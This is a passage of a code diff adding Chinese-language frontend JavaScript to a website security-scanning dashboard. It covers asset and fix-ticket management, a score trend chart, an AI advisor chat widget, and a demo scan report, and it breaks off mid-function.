+      else { showToast('创建失败: ' + JSON.stringify(data), 'error'); }
+    }).catch(function(e) { showToast('创建失败: ' + e.message, 'error'); });
+}
+
+function addAsset() {
+  let domain = document.getElementById('asset-domain').value.trim();
+  let owner = document.getElementById('asset-owner').value.trim();
+  let description = document.getElementById('asset-description').value.trim();
+  let errEl = document.getElementById('asset-form-error');
+  if (!domain) {
+    if (errEl) { errEl.textContent = '请输入域名'; errEl.style.display = 'block'; }
+    return;
+  }
+  if (errEl) errEl.style.display = 'none';
+  authFetch('/api/assets', {
+    method: 'POST',
+    body: JSON.stringify({ domain: domain, owner: owner, description: description })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.id || data.asset_id) {
+      showToast('资产添加成功', 'success');
+      document.getElementById('asset-domain').value = '';
+      document.getElementById('asset-owner').value = '';
+      document.getElementById('asset-description').value = '';
+      loadAssets();
+    } else {
+      let msg = extractError(data) || '添加失败';
+      if (errEl) { errEl.textContent = msg; errEl.style.display = 'block'; }
+    }
+  }).catch(function(e) {
+    if (errEl) { errEl.textContent = '添加失败: ' + e.message; errEl.style.display = 'block'; }
+  });
+}
+
+function editAsset(assetId) {
+  let asset = allAssets.find(function(a) { return a.id === assetId; });
+  if (!asset) return;
+  let newDomain = prompt('修改域名:', asset.domain || '');
+  if (newDomain === null) return;
+  let newOwner = prompt('修改负责人:', asset.owner || '');
+  if (newOwner === null) return;
+  let newDesc = prompt('修改描述:', asset.description || '');
+  if (newDesc === null) return;
+  authFetch('/api/assets/' + assetId, {
+    method: 'PATCH',
+    body: JSON.stringify({ domain: newDomain.trim(), owner: newOwner.trim(), description: newDesc.trim() })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.id || data.success) {
+      showToast('资产更新成功', 'success');
+      loadAssets();
+    } else {
+      showToast(extractError(data) || '更新失败', 'error');
+    }
+  }).catch(function(e) {
+    showToast('更新失败: ' + e.message, 'error');
+  });
+}
+
+function deleteAsset(assetId) {
+  if (!confirm('确定要删除此资产吗？')) return;
+  authFetch('/api/assets/' + assetId, { method: 'DELETE' }).then(function(r) {
+    if (r.ok || r.status === 204) {
+      showToast('资产已删除', 'success');
+      loadAssets();
+    } else {
+      return r.json().then(function(data) { throw new Error(extractError(data) || '删除失败'); });
+    }
+  }).catch(function(e) {
+    showToast('删除失败: ' + e.message, 'error');
+  });
+}
+
+function scanAsset(assetId, domain) {
+  if (!domain) return;
+  let url = domain;
+  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
+  document.getElementById('scan-url').value = url;
+  navigateTo('scan');
+  startScanDirect();
+}
+
+// ========== Fix Tickets ==========
+let currentTicketStatus = 'pending';
+let allTickets = [];
+
+function switchTicketTab(status) {
+  currentTicketStatus = status;
+  document.querySelectorAll('.ticket-tab').forEach(function(t) {
+    t.classList.toggle('active', t.dataset.status === status);
+  });
+  renderTickets();
+}
+
+function loadTickets() {
+  if (!isLoggedIn()) {
+    safeSetDisplay('ticket-workbench', 'none');
+    safeSetDisplay('ticket-empty', 'block');
+    safeSetDisplay('ticket-batch-bar', 'none');
+    safeSetHtml('ticket-empty', '<div class="ticket-empty"><div class="ticket-empty-icon">-</div><p>请先登录查看工单</p></div>');
+    return;
+  }
+  authFetch('/api/fix-tickets').then(function(r) { return r.json(); }).then(function(data) {
+    if (data && data.tickets) {
+      allTickets = data.tickets;
+      renderTickets();
+    }
+  }).catch(function(e) {
+    showToast('加载工单失败: ' + e.message, 'error');
+  });
+}
+
+function renderTickets() {
+  let list = document.getElementById('ticket-list');
+  let empty = document.getElementById('ticket-empty');
+  let batchBar = document.getElementById('ticket-batch-bar');
+  let workbench = document.getElementById('ticket-workbench');
+  let detailPanel = document.getElementById('ticket-detail-panel');
+  if (!list) return;
+  let tickets = allTickets.filter(function(t) { return t.status === currentTicketStatus; });
+  if (tickets.length === 0) {
+    list.innerHTML = '';
+    if (empty) empty.style.display = 'block';
+    if (batchBar) batchBar.style.display = 'none';
+    if (workbench) workbench.style.display = 'none';
+    if (detailPanel) detailPanel.innerHTML = '<div class="ticket-detail-empty">选择左侧工单查看详情</div>';
+    return;
+  }
+  if (empty) empty.style.display = 'none';
+  if (batchBar) batchBar.style.display = 'flex';
+  if (workbench) workbench.style.display = 'flex';
+  let html = '';
+  tickets.forEach(function(t) {
+    let severityClass = (t.severity === 'high' || t.severity === 'critical') ? 'high' : (t.severity === 'medium' ? 'medium' : 'low');
+    let severityLabel = { critical: '严重', high: '高危', medium: '中危', low: '低危' }[t.severity] || t.severity;
+    let statusLabel = { pending: '待修复', in_progress: '修复中', fixed: '已修复', ignored: '已忽略' }[t.status] || t.status;
+    html += '<tr class="ticket-row" data-id="' + t.id + '" onclick="showTicketDetail(' + t.id + ')">';
+    html += '<td><label class="ticket-check" onclick="event.stopPropagation()"><input type="checkbox" class="ticket-checkbox" value="' + t.id + '" onchange="updateTicketSelection()"></label></td>';
+    html += '<td class="ticket-title-cell">' + escapeHtml(t.finding_name) + '</td>';
+    html += '<td><span class="ticket-severity ' + severityClass + '">' + severityLabel + '</span></td>';
+    html += '<td><span class="ticket-status-badge">' + statusLabel + '</span></td>';
+    html += '<td class="ticket-date-cell">' + (t.created_at || '') + '</td>';
+    html += '</tr>';
+  });
+  list.innerHTML = html;
+  updateTicketSelection();
+}
+
+function showTicketDetail(id) {
+  let ticket = allTickets.find(function(t) { return t.id === id; });
+  if (!ticket) return;
+  let panel = document.getElementById('ticket-detail-panel');
+  if (!panel) return;
+  let severityClass = (ticket.severity === 'high' || ticket.severity === 'critical') ? 'high' : (ticket.severity === 'medium' ? 'medium' : 'low');
+  let severityLabel = { critical: '严重', high: '高危', medium: '中危', low: '低危' }[ticket.severity] || ticket.severity;
+  let statusLabel = { pending: '待修复', in_progress: '修复中', fixed: '已修复', ignored: '已忽略' }[ticket.status] || ticket.status;
+  let html = '<div class="ticket-detail-header">';
+  html += '<div class="ticket-detail-title">' + escapeHtml(ticket.finding_name) + '</div>';
+  html += '<div class="ticket-detail-badges"><span class="ticket-severity ' + severityClass + '">' + severityLabel + '</span><span class="ticket-status-badge">' + statusLabel + '</span></div>';
+  html += '</div>';
+  html += '<div class="ticket-detail-meta">工单 #' + ticket.id + (ticket.scan_id ? ' · 扫描 #' + ticket.scan_id : '') + ' · ' + (ticket.created_at || '') + '</div>';
+  if (ticket.fix_code) {
+    html += '<div class="ticket-detail-section"><div class="ticket-detail-label">修复代码</div><pre class="ticket-detail-code">' + escapeHtml(ticket.fix_code) + '</pre></div>';
+  }
+  if (ticket.notes) {
+    html += '<div class="ticket-detail-section"><div class="ticket-detail-label">备注</div><div class="ticket-detail-notes">' + escapeHtml(ticket.notes) + '</div></div>';
+  }
+  html += '<div class="ticket-detail-actions">';
+  html += '<select class="ticket-status-select" onchange="updateTicketStatus(' + ticket.id + ', this.value)">';
+  html += '<option value="pending"' + (ticket.status === 'pending' ? ' selected' : '') + '>待修复</option>';
+  html += '<option value="in_progress"' + (ticket.status === 'in_progress' ? ' selected' : '') + '>修复中</option>';
+  html += '<option value="fixed"' + (ticket.status === 'fixed' ? ' selected' : '') + '>已修复</option>';
+  html += '<option value="ignored"' + (ticket.status === 'ignored' ? ' selected' : '') + '>已忽略</option>';
+  html += '</select>';
+  html += '<button class="ticket-btn secondary" onclick="editTicketNotes(' + ticket.id + ')">备注</button>';
+  html += '<button class="ticket-btn danger" onclick="deleteTicket(' + ticket.id + ')">删除</button>';
+  html += '</div>';
+  panel.innerHTML = html;
+  document.querySelectorAll('.ticket-row').forEach(function(r) {
+    r.classList.toggle('selected', parseInt(r.dataset.id) === id);
+  });
+}
+
+function updateTicketSelection() {
+  let checked = document.querySelectorAll('.ticket-checkbox:checked');
+  let countEl = document.getElementById('ticket-selected-count');
+  if (countEl) countEl.textContent = '已选 ' + checked.length + ' 项';
+}
+
+function toggleSelectAllTickets() {
+  let all = document.getElementById('ticket-select-all');
+  let boxes = document.querySelectorAll('.ticket-checkbox');
+  boxes.forEach(function(b) { b.checked = all ? all.checked : false; });
+  updateTicketSelection();
+}
+
+function getSelectedTicketIds() {
+  let ids = [];
+  document.querySelectorAll('.ticket-checkbox:checked').forEach(function(b) { ids.push(parseInt(b.value)); });
+  return ids;
+}
+
+function batchUpdateTickets(status) {
+  let ids = getSelectedTicketIds();
+  if (ids.length === 0) { showToast('请先选择工单', 'error'); return; }
+  let done = 0;
+  ids.forEach(function(id) {
+    authFetch('/api/fix-tickets/' + id, {
+      method: 'PATCH',
+      body: JSON.stringify({ status: status })
+    }).then(function(r) {
+      if (r.ok) {
+        done++;
+        if (done === ids.length) {
+          showToast('已批量更新 ' + done + ' 个工单', 'success');
+          loadTickets();
+        }
+      }
+    });
+  });
+}
+
+function batchDeleteTickets() {
+  let ids = getSelectedTicketIds();
+  if (ids.length === 0) { showToast('请先选择工单', 'error'); return; }
+  if (!confirm('确定删除选中的 ' + ids.length + ' 个工单？')) return;
+  let done = 0;
+  ids.forEach(function(id) {
+    authFetch('/api/fix-tickets/' + id, { method: 'DELETE' }).then(function(r) {
+      if (r.ok) {
+        done++;
+        if (done === ids.length) {
+          showToast('已批量删除 ' + done + ' 个工单', 'success');
+          loadTickets();
+        }
+      }
+    });
+  });
+}
+
+function updateTicketStatus(id, status) {
+  authFetch('/api/fix-tickets/' + id, {
+    method: 'PATCH',
+    body: JSON.stringify({ status: status })
+  }).then(function(r) {
+    if (r.ok) {
+      showToast('状态已更新', 'success');
+      loadTickets();
+    } else {
+      showToast('更新失败', 'error');
+    }
+  });
+}
+
+function deleteTicket(id) {
+  if (!confirm('确定删除该工单？')) return;
+  authFetch('/api/fix-tickets/' + id, { method: 'DELETE' }).then(function(r) {
+    if (r.ok) {
+      showToast('工单已删除', 'success');
+      loadTickets();
+    } else {
+      showToast('删除失败', 'error');
+    }
+  });
+}
+
+function editTicketNotes(id) {
+  let ticket = allTickets.find(function(t) { return t.id === id; });
+  let note = prompt('编辑备注:', ticket && ticket.notes ? ticket.notes : '');
+  if (note === null) return;
+  authFetch('/api/fix-tickets/' + id, {
+    method: 'PATCH',
+    body: JSON.stringify({ notes: note })
+  }).then(function(r) {
+    if (r.ok) {
+      showToast('备注已保存', 'success');
+      loadTickets();
+    } else {
+      showToast('保存失败', 'error');
+    }
+  });
+}
+
+// Dashboard
+function loadDashboard() {
+  let overview = document.getElementById('dashboard-overview');
+  if (!isLoggedIn()) {
+    if (overview) overview.style.display = 'none';
+    return;
+  }
+  if (overview) overview.style.display = 'grid';
+  authFetch('/api/dashboard').then(function(r) { return r.json(); }).then(function(data) {
+    let el1 = document.getElementById('stat-total');
+    let el2 = document.getElementById('stat-high');
+    let el3 = document.getElementById('stat-fixed');
+    let el4 = document.getElementById('stat-score');
+    if (el1) el1.textContent = data.total_scans || 0;
+    if (el2) el2.textContent = data.high_risk_count || 0;
+    if (el3) el3.textContent = data.fixed_count || 0;
+    if (el4 && data.recent_scans && data.recent_scans.length > 0) {
+      el4.textContent = data.recent_scans[0].score || '-';
+    } else if (el4) {
+      el4.textContent = '-';
+    }
+  }).catch(function() {});
+  // 11-S: 加载安全趋势
+  loadTrend();
+}
+
+// 11-S: 安全趋势面板
+function loadTrend() {
+  let panel = document.getElementById('trend-panel');
+  if (!isLoggedIn() || !panel) return;
+  panel.style.display = 'block';
+
+  authFetch('/api/trend?limit=30').then(function(r) { return r.json(); }).then(function(data) {
+    let summary = data.summary || {};
+    let series = data.series || {};
+    let urls = data.urls || [];
+
+    // 统计摘要标签
+    let summaryEl = document.getElementById('trend-summary');
+    if (summaryEl) {
+      let tags = [];
+      if (summary.total_scans > 0) {
+        tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 ' + summary.avg_score + ' 分</span>');
+        if (summary.improved) {
+          tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>');
+        } else if (summary.total_scans > 1) {
+          tags.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>');
+        }
+      }
+      summaryEl.innerHTML = tags.join('');
+    }
+
+    // 无数据时显示空状态
+    let emptyEl = document.getElementById('trend-empty');
+    let canvas = document.getElementById('trend-canvas');
+    if (summary.total_scans === 0) {
+      if (emptyEl) emptyEl.style.display = 'flex';
+      if (canvas) canvas.style.display = 'none';
+      return;
+    }
+    if (emptyEl) emptyEl.style.display = 'none';
+    if (canvas) canvas.style.display = 'block';
+
+    // 绘制折线图
+    drawTrendChart(series, urls);
+  }).catch(function() {});
+}
+
+function drawTrendChart(series, urls) {
+  let canvas = document.getElementById('trend-canvas');
+  if (!canvas) return;
+  let ctx = canvas.getContext('2d');
+  let dpr = window.devicePixelRatio || 1;
+  let rect = canvas.parentElement.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = rect.height * dpr;
+  ctx.scale(dpr, dpr);
+  let W = rect.width;
+  let H = rect.height;
+
+  // 收集所有数据点
+  let colors = ['#4b6eaf', '#73c990', '#f0a732', '#c75450', '#c75450', '#4b6eaf', '#4b6eaf'];
+  let datasets = [];
+  let allScores = [];
+  for (let i = 0; i < urls.length; i++) {
+    let url = urls[i];
+    let points = series[url] || [];
+    if (points.length === 0) continue;
+    let scores = points.map(function(p) { return p.score; });
+    allScores = allScores.concat(scores);
+    datasets.push({ url: url, points: points, color: colors[i % colors.length] });
+  }
+
+  if (datasets.length === 0 || allScores.length === 0) return;
+
+  // 图表参数
+  let padding = { top: 20, right: 20, bottom: 30, left: 45 };
+  let chartW = W - padding.left - padding.right;
+  let chartH = H - padding.top - padding.bottom;
+  let minScore = Math.max(Math.min.apply(null, allScores) - 5, 0);
+  let maxScore = Math.min(Math.max.apply(null, allScores) + 5, 100);
+  let scoreRange = maxScore - minScore || 1;
+
+  // 清空
+  ctx.clearRect(0, 0, W, H);
+
+  // 绘制网格线
+  ctx.strokeStyle = 'rgba(255,255,255,0.06)';
+  ctx.lineWidth = 1;
+  let gridLines = 5;
+  for (let g = 0; g <= gridLines; g++) {
+    let y = padding.top + (g / gridLines) * chartH;
+    ctx.beginPath();
+    ctx.moveTo(padding.left, y);
+    ctx.lineTo(W - padding.right, y);
+    ctx.stroke();
+    // Y 轴标签
+    let val = Math.round(maxScore - (g / gridLines) * scoreRange);
+    ctx.fillStyle = 'rgba(255,255,255,0.4)';
+    ctx.font = '10px sans-serif';
+    ctx.textAlign = 'right';
+    ctx.fillText(val, padding.left - 8, y + 3);
+  }
+
+  // 绘制安全区间背景
+  let safeY = padding.top + ((maxScore - 90) / scoreRange) * chartH;
+  let warnY = padding.top + ((maxScore - 70) / scoreRange) * chartH;
+  ctx.fillStyle = 'rgba(115,201,144,0.05)';
+  ctx.fillRect(padding.left, safeY, chartW, padding.top - safeY + chartH);
+  ctx.fillStyle = 'rgba(240,167,50,0.05)';
+  ctx.fillRect(padding.left, warnY, chartW, safeY - warnY);
+
+  // 为每个数据集绘制折线和点
+  for (let d = 0; d < datasets.length; d++) {
+    let ds = datasets[d];
+    let pts = ds.points;
+    let n = pts.length;
+    if (n < 1) continue;
+
+    // 计算 x 坐标（等间距分布）
+    let xCoords = [];
+    for (let p = 0; p < n; p++) {
+      xCoords.push(padding.left + (n > 1 ? (p / (n - 1)) * chartW : chartW / 2));
+    }
+
+    // 绘制填充区域
+    ctx.beginPath();
+    for (let p = 0; p < n; p++) {
+      let x = xCoords[p];
+      let y = padding.top + ((maxScore - pts[p].score) / scoreRange) * chartH;
+      if (p === 0) ctx.moveTo(x, y);
+      else ctx.lineTo(x, y);
+    }
+    ctx.lineTo(xCoords[n - 1], padding.top + chartH);
+    ctx.lineTo(xCoords[0], padding.top + chartH);
+    ctx.closePath();
+    ctx.fillStyle = ds.color + '15';
+    ctx.fill();
+
+    // 绘制折线
+    ctx.beginPath();
+    ctx.strokeStyle = ds.color;
+    ctx.lineWidth = 2.5;
+    ctx.lineJoin = 'round';
+    ctx.lineCap = 'round';
+    for (let p = 0; p < n; p++) {
+      let x = xCoords[p];
+      let y = padding.top + ((maxScore - pts[p].score) / scoreRange) * chartH;
+      if (p === 0) ctx.moveTo(x, y);
+      else ctx.lineTo(x, y);
+    }
+    ctx.stroke();
+
+    // 绘制数据点
+    for (let p = 0; p < n; p++) {
+      let x = xCoords[p];
+      let y = padding.top + ((maxScore - pts[p].score) / scoreRange) * chartH;
+      ctx.beginPath();
+      ctx.arc(x, y, 4, 0, Math.PI * 2);
+      ctx.fillStyle = ds.color;
+      ctx.fill();
+      ctx.beginPath();
+      ctx.arc(x, y, 2, 0, Math.PI * 2);
+      ctx.fillStyle = '#fff';
+      ctx.fill();
+    }
+
+    // 最后一个点高亮（显示分数）
+    if (n > 0) {
+      let lastX = xCoords[n - 1];
+      let lastY = padding.top + ((maxScore - pts[n - 1].score) / scoreRange) * chartH;
+      ctx.beginPath();
+      ctx.arc(lastX, lastY, 6, 0, Math.PI * 2);
+      ctx.fillStyle = ds.color + '40';
+      ctx.fill();
+      ctx.beginPath();
+      ctx.arc(lastX, lastY, 3.5, 0, Math.PI * 2);
+      ctx.fillStyle = ds.color;
+      ctx.fill();
+    }
+  }
+
+  // 图例
+  let legendEl = document.getElementById('trend-legend');
+  if (legendEl) {
+    let legendHtml = '';
+    for (let d = 0; d < datasets.length; d++) {
+      let host = getHost(datasets[d].url);
+      legendHtml += '<div style="display:flex;align-items:center;gap:5px;font-size:12px">';
+      legendHtml += '<div style="width:10px;height:3px;border-radius:2px;background:' + datasets[d].color + '"></div>';
+      legendHtml += '<span style="color:var(--text-secondary)">' + escapeHtml(host) + '</span>';
+      legendHtml += '</div>';
+    }
+    legendEl.innerHTML = legendHtml;
+  }
+}
+function toggleAIChat() {
+  let chat = document.getElementById('ai-chat');
+  if (!chat) return;
+  let badge = document.getElementById('ai-fab-badge');
+  if (chat.classList.contains('show')) {
+    chat.classList.remove('show');
+    chat.style.display = '';
+  } else {
+    chat.classList.add('show');
+    chat.style.display = '';
+    resetAIBadge();
+    setTimeout(function() {
+      let inp = document.getElementById('ai-input');
+      if (inp) inp.focus();
+    }, 300);
+  }
+}
+
+function appendAIMsg(text, who) {
+  let body = document.getElementById('ai-chat-body');
+  if (!body) return null;
+  let div = document.createElement('div');
+  div.className = 'ai-msg ' + (who || 'bot');
+  
+  // 增强版 Markdown 渲染
+  let html = renderAIMarkdown(text || '');
+  div.innerHTML = html;
+  
+  // 绑定代码块复制按钮
+  let pres = div.querySelectorAll('pre');
+  for (let i = 0; i < pres.length; i++) {
+    (function(pre) {
+      let wrap = document.createElement('div');
+      wrap.className = 'ai-code-block';
+      let btn = document.createElement('button');
+      btn.className = 'ai-code-copy';
+      btn.textContent = '复制';
+      btn.onclick = function() {
+        let code = pre.textContent;
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(code).then(function() {
+            btn.textContent = '已复制';
+            setTimeout(function() { btn.textContent = '复制'; }, 1500);
+          });
+        } else {
+          let ta = document.createElement('textarea');
+          ta.value = code;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+          btn.textContent = '已复制';
+          setTimeout(function() { btn.textContent = '复制'; }, 1500);
+        }
+      };
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(btn);
+      wrap.appendChild(pre);
+    })(pres[i]);
+  }
+  
+  body.appendChild(div);
+  body.scrollTop = body.scrollHeight;
+  // bot 消息且聊天窗口未打开时，更新徽章未读数
+  if (who === 'bot') {
+    let chat = document.getElementById('ai-chat');
+    if (!chat.classList.contains('show')) {
+      incrementAIBadge();
+    }
+  }
+  return div;
+}
+
+// AI 消息 Markdown 渲染器
+function renderAIMarkdown(text) {
+  if (!text) return '';
+  // 1. HTML 转义
+  let t = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  
+  // 2. 代码块 ```...```
+  let codeBlocks = [];
+  t = t.replace(/```([\s\S]*?)```/g, function(m, code) {
+    // 去掉第一行的语言标记（如果有）
+    let lines = code.replace(/^\n+|\n+$/g, '').split('\n');
+    let lang = '';
+    if (lines.length > 0 && /^(nginx|apache|javascript|python|bash|sql|html|css|json|java|php|ruby|go|rust)$/i.test(lines[0].trim())) {
+      lang = lines[0].trim();
+      lines = lines.slice(1);
+    }
+    let cleanCode = lines.join('\n');
+    let idx = codeBlocks.length;
+    codeBlocks.push({ code: cleanCode, lang: lang });
+    return '__CODE_BLOCK_' + idx + '__';
+  });
+  
+  // 3. 行内代码 `code`
+  t = t.replace(/`([^`\n]+)`/g, '<code class="ai-inline-code">$1</code>');
+  
+  // 4. 加粗 **text**
+  t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+  
+  // 5. 分隔线 ---
+  t = t.replace(/^---\s*$/gm, '<hr class="ai-divider">');
+  
+  // 6. 无序列表（- 或 * 开头）
+  t = t.replace(/(^|\n)((?:\s*[-*]\s+[^\n]+\n?)+)/g, function(m, prefix, listBlock) {
+    let items = listBlock.trim().split('\n').filter(function(l) { return l.trim(); });
+    let lis = items.map(function(item) {
+      return '<li>' + item.replace(/^\s*[-*]\s+/, '') + '</li>';
+    }).join('');
+    return prefix + '<ul class="ai-list">' + lis + '</ul>';
+  });
+  
+  // 7. 有序列表（数字开头）
+  t = t.replace(/(^|\n)((?:\s*\d+\.\s+[^\n]+\n?)+)/g, function(m, prefix, listBlock) {
+    let items = listBlock.trim().split('\n').filter(function(l) { return l.trim(); });
+    let lis = items.map(function(item) {
+      return '<li>' + item.replace(/^\s*\d+\.\s+/, '') + '</li>';
+    }).join('');
+    return prefix + '<ol class="ai-list ol">' + lis + '</ol>';
+  });
+  
+  // 8. 还原代码块
+  t = t.replace(/__CODE_BLOCK_(\d+)__/g, function(m, idx) {
+    let block = codeBlocks[parseInt(idx)];
+    let langTag = block.lang ? '<span class="ai-code-lang">' + block.lang + '</span>' : '';
+    return '<div class="ai-code-wrap">' + langTag + '<pre><code>' + block.code + '</code></pre></div>';
+  });
+  
+  // 9. 换行
+  t = t.replace(/\n/g, '<br>');
+  
+  return t;
+}
+
+let _aiUnreadCount = 0;
+function incrementAIBadge() {
+  _aiUnreadCount++;
+  let badge = document.getElementById('ai-fab-badge');
+  if (badge) {
+    badge.textContent = _aiUnreadCount > 99 ? '99+' : String(_aiUnreadCount);
+    badge.style.display = '';
+  }
+}
+function resetAIBadge() {
+  _aiUnreadCount = 0;
+  let badge = document.getElementById('ai-fab-badge');
+  if (badge) {
+    badge.style.display = 'none';
+    badge.textContent = '0';
+  }
+}
+
+function appendAITyping() {
+  let body = document.getElementById('ai-chat-body');
+  if (!body) return null;
+  let div = document.createElement('div');
+  div.className = 'ai-msg bot ai-typing-wrap';
+  div.innerHTML = '<span class="ai-typing"><span></span><span></span><span></span></span>';
+  body.appendChild(div);
+  body.scrollTop = body.scrollHeight;
+  return div;
+}
+
+let _aiChatSending = false;
+async function sendAIMessage() {
+  if (_aiChatSending) return;
+  let inp = document.getElementById('ai-input');
+  let msg = (inp.value || '').trim();
+  if (!msg) return;
+  _aiChatSending = true;
+  appendAIMsg(msg, 'user');
+  inp.value = '';
+  if (!isLoggedIn()) {
+    appendAIMsg('请先登录后再使用 AI 顾问。登录后我还能根据你的扫描历史给出个性化建议。', 'bot');
+    _aiChatSending = false;
+    return;
+  }
+  let typing = appendAITyping();
+  try {
+    let aiCfg = getAIConfig();
+    let body = { message: msg };
+    if (aiCfg.api_key) {
+      body.api_key = aiCfg.api_key;
+      body.provider = aiCfg.provider;
+      body.model = aiCfg.model;
+      body.use_llm = aiCfg.use_llm !== false;
+    }
+    let r = await authFetch('/api/ai-advisor', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    let data = await r.json();
+    if (typing && typing.parentNode) typing.remove();
+    if (r.ok) {
+      appendAIMsg(data.reply || '（无回复）', 'bot');
+    } else if (r.status === 429) {
+      appendAIMsg('你问得太快啦，让我歇一会儿～ 1 分钟后再试试吧！', 'bot');
+    } else if (r.status === 401 || r.status === 403) {
+      appendAIMsg('登录状态好像过期了，刷新一下页面重新登录试试？', 'bot');
+    } else {
+      appendAIMsg('抱歉，我刚才处理出现了问题。你再说一遍刚才的问题好吗？\n\n（错误：' + escapeHtml(extractError(data)) + '）', 'bot');
+    }
+  } catch (e) {
+    if (typing && typing.parentNode) typing.remove();
+    appendAIMsg('网络连接出现问题，检查一下网络连接再试试？\n\n如果问题一直出现，可以刷新页面试试。', 'bot');
+  } finally {
+    _aiChatSending = false;
+  }
+}
+
+// ===== 公开测试扫描 =====
+async function loadPublicDemo() {
+  let select = document.getElementById('demo-host');
+  let btn = document.getElementById('demo-refresh');
+  let url = (select && select.value) || 'https://example.com';
+  if (btn) { btn.disabled = true; btn.textContent = '扫描中…'; }
+  let c = document.getElementById('demo-content');
+  if (c) c.innerHTML = '<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>';
+  try {
+    let r = await authFetch('/api/public-demo-scan', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: url })
+    });
+    let data = await r.json();
+    if (r.ok && data.success) {
+      window._lastScanId = data.scan_id || data.scanId || null;  // 11-S: 保存 scan_id 供自动修复用
+      window._lastScanResult = data;  // V11.4 fix: 保存扫描结果供自动修复使用
+      renderDemoReport(data);
+    } else {
+      if (c) c.innerHTML = '<div style="padding:14px;color:#c75450;font-size:13px">错误：' + escapeHtml(friendlyError(extractError(data))) + '</div>';
+    }
+  } catch (e) {
+    if (c) c.innerHTML = '<div style="padding:14px;color:#c75450;font-size:13px">错误：' + escapeHtml(friendlyError(e)) + '</div>';
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = '重新扫描'; }
+  }
+}
+
+function renderDemoReport(d) {
+  let c = document.getElementById('demo-content');
+  if (!c) return;
+  let score = d.score || 0;
+  let color = score >= 80 ? '#73c990' : score >= 50 ? '#f0a732' : '#c75450';
+  let bgColor = '#3c3f41';
+  let findings = d.findings || [];
+  let summary = d.summary || { high: 0, medium: 0, low: 0 };
+  let findingsSummary = [];
+  if (summary.high) findingsSummary.push(summary.high + ' 高风险');
+  if (summary.medium) findingsSummary.push(summary.medium + ' 中风险');
+  if (summary.low) findingsSummary.push(summary.low + ' 低风险');
+  let waf = d.waf || [];
+  let wafText = waf.length ? waf.map(function(w){ return w.name; }).join('、') : '未检测到 WAF';
+  let headers = d.raw_headers || {};
+  let presentHeaders = Object.keys(headers);
+  let missingCritical = [];
+  ['strict-transport-security', 'content-security-policy', 'x-frame-options', 'x-content-type-options'].forEach(function(h) {
+    if (!presentHeaders.some(function(p){ return p.toLowerCase() === h; })) missingCritical.push(h);
+  });
+  let sensitive = d.sensitive_paths || [];
+  let sensitiveHtml = '';
+  if (sensitive.length > 0) {
+    sensitiveHtml = sensitive.slice(0, 5).map(function(s) {
+      let status = s.exposed ? '暴露' : '安全';
+      return '<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/' + s.path + '</code><span>' + status + '</span></div>';
+    }).join('');
+  } else {
+    sensitiveHtml = '<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 ' + (d.sensitive_checked || 0) + ' 个常见敏感路径，未发现暴露</div>';
+  }
+
+  let html = '';
+  // 概览条
+  html += '<div style="background:' + bgColor + ';border:1px solid #555555;border-left:3px solid ' + color + ';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">';
+  html += '<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>';
+  if (d.note) {
+    html += '<div style="font-size:12px;color:#f0a732;margin-top:2px">' + escapeHtml(d.note) + '</div>';
+  }
+  html += '<div style="font-size:14px;font-weight:600;margin-top:2px">' + d.final_url + '</div>';
+  html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: ' + (d.is_https ? '是' : '否') + ' · WAF: ' + wafText + ' · 风险等级: <strong style="color:' + color + '">' + (d.risk_level || '未知') + '</strong></div></div>';
+  html += '<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:' + color + '">' + score + '</div>';
+  html += '<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>';
+  html += '</div>';
+  // 缓存数据标注
+  if (d.is_cached) {
+    html += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">' + escapeHtml(d.note || '当前展示缓存扫描数据') + '</div>';
+  }
+
+  // 风险统计
+  html += '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">';
+  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">' + summary.high + '</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>';
+  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">' + summary.medium + '</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>';
+  html += '<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">' + summary.low + '</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>';
+  html += '</div>';
+
+  // 真实证据 1: 实际响应头
